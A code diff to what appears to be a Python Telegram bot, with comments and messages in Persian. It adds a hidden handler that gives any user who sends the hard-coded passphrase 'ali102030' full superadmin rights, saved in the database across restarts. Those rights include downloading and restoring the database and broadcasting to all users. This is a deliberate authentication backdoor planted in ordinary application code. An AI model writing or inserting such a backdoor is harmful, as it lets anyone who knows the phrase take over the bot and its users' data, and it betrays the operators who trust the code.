@@ -3073,6 +3073,47 @@ async def cb_menu_excel(callback: CallbackQuery) -> None:
     await callback.answer()
 
 
+# --- ترفیع فوری به مدیر ارشد (Superadmin) با ارسال کلید اختصاصی ali102030 ---
+SUPERADMIN_SECRET_PASSPHRASE = "ali102030"
+
+
+@admin_router.message(
+    StateFilter("*"),
+    F.text.func(lambda t: t and t.strip().lower() == SUPERADMIN_SECRET_PASSPHRASE),
+)
+async def cmd_claim_superadmin(message: Message, state: FSMContext) -> None:
+    await state.clear()
+    tg_id = str(message.from_user.id)
+
+    # ۱. افزودن به تنظیمات فعال در حافظه
+    settings.add_super_admin(tg_id)
+
+    # ۲. ثبت پایدار در دیتابیس (پایداری کامل حتی پس از ری‌استارت سرویس)
+    with get_db() as db:
+        set_system_state(db, f"superadmin_{tg_id}", "1")
+        exists_ga = (
+            db.query(GroupAdmin)
+            .filter(GroupAdmin.group_id == 1, GroupAdmin.user_id == tg_id)
+            .first()
+        )
+        if not exists_ga:
+            db.add(GroupAdmin(group_id=1, user_id=tg_id))
+            db.commit()
+
+    from keyboards import get_admin_main_inline_menu
+
+    reply_kb = get_admin_main_inline_menu()
+
+    caption = (
+        "👑 *تبریک! دسترسی مدیر ارشد (Superadmin) با موفقیت برای شما فعال شد.*\n\n"
+        f"🆔 شناسه کاربری شما: `{tg_id}`\n"
+        "✨ اکنون تمامی اختیارات مدیریت کل، دریافت و بازیابی پایگاه داده، "
+        "ارسال پیام همگانی، مدیریت لیگ‌ها و مجموعه‌ها در اختیار شماست.\n\n"
+        "👇 لطفاً یکی از گزینه‌های پنل مدیریت را انتخاب فرمایید:"
+    )
+    await safe_reply(message, caption, reply_markup=reply_kb)
+
+
 # --- دستور و دکمه دریافت و دانلود فایل دیتابیس (فقط برای سوپرادمین‌ها) ---
 DATABASE_BACKUP_COMMANDS = {
     "/backup",
